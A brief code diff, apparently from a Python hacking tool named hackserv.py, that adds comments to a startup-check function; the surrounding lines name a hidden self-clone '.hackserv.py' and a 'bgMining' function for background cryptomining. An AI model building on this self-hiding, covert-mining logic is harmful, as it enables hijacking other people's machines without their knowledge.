@@ -330,10 +330,10 @@ def bgMining():
     # Mine crypto in the background.
             
 def srtChk(): # Startup Check. (Still in testing!)
-    name = str(__name__)
-    hd = str(os.path.expanduser('~')) 
-    hdPath = str(os.getcwd())
-    clone = hdPath + '/.hackserv.py'
+    name = str(__name__) # Get filename.
+    hd = str(os.path.expanduser('~')) # Get path to home directory.
+    hdPath = str(os.getcwd()) # Get current working directory.
+    clone = hdPath + '/.hackserv.py' # Set clone name as .hackserv.py in current working directory.
     if name == clone:
         if debugmode: # If debugmode is True, msgs will print to screen.
             print(name + " and "+ clone + " are the same file!")
